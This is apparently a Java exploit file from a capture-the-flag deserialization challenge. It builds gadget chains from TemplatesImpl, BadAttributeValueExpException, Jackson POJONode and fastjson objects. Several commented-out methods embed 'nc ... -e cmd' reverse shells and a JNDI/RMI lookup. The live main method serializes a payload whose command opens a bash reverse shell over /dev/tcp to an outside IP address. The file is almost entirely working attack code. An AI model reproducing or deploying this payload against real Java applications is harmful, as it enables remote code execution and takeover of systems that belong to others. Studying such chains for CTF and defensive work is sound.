package com.ctf.ezser.exp;

//import com.alibaba.fastjson.JSONArray;
//import com.alibaba.fastjson.JSONObject;
import com.ctf.ezser.bean.MyBean;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import unknown.tools.Gadget;
import unknown.tools.MyMethods;
import javax.management.BadAttributeValueExpException;
import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.util.ArrayList;

public class Exp {

    //public static void exp1() throws Exception{
    //    //TemplatesImpl interceptorShell = Gadget.getInterceptorShell();
    //
    //    TemplatesImpl templates = Gadget.getTemplateImpl("nc 127.0.0.1 9999 -e cmd");
    //    JSONArray objects = new JSONArray();
    //    objects.add(templates);
    //
    //    BadAttributeValueExpException bd = Gadget.getBadAttributeValueExpException(objects);
    //
    //    ArrayList<Object> objects1 = new ArrayList<>();
    //
    //    //下面这两个add交换顺序就报：autoType is not support
    //    objects1.add(templates);
    //    objects1.add(bd);
    //
    //    String data = MyMethods.URLEncode(MyMethods.base64Encode(MyMethods.serialize(objects1)));
    //    System.out.println(data);
    //
    //    //MyMethods.unserialize(MyMethods.serialize(objects1));
    //
    //}
    //public static void exp2() throws Exception{
    //
    //    TemplatesImpl templates = Gadget.getTemplateImpl("nc 127.0.0.1 9999 -e cmd");
    //    JSONArray objects = new JSONArray();
    //    objects.add(templates);
    //
    //    BadAttributeValueExpException bd = Gadget.getBadAttributeValueExpException(objects);
    //
    //
    //    String data = MyMethods.URLEncode(MyMethods.base64Encode(MyMethods.serialize(bd)));
    //    System.out.println(data);
    //
    //    MyMethods.unserialize(MyMethods.serialize(bd));
    //
    //}

    //public static void exp3() throws Exception{
    //
    //    JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://127.0.0.1:1099/Foo");
    //    RMIConnector rmiConnector = new RMIConnector(jmxServiceURL,null);
    //    MyBean myBean = new MyBean(null,null,rmiConnector);
    //
    //    JSONObject objects = new JSONObject();
    //    objects.put("123",myBean);
    //
    //    BadAttributeValueExpException bd = Gadget.getBadAttributeValueExpException(objects);
    //
    //    System.out.println(MyMethods.URLEncode(MyMethods.base64Encode(MyMethods.serialize(bd))));
    //
    //}

    public static void main(String[] args) throws Exception{

        MyMethods.serialize(Gadget.getBadAttributeValueExpException(new POJONode(Gadget.getTemplateImpl("/bin/bash -c bash${IFS}-i${IFS}>&/dev/tcp/101.200.148.123/10002<&1"))),"a");

    }
}











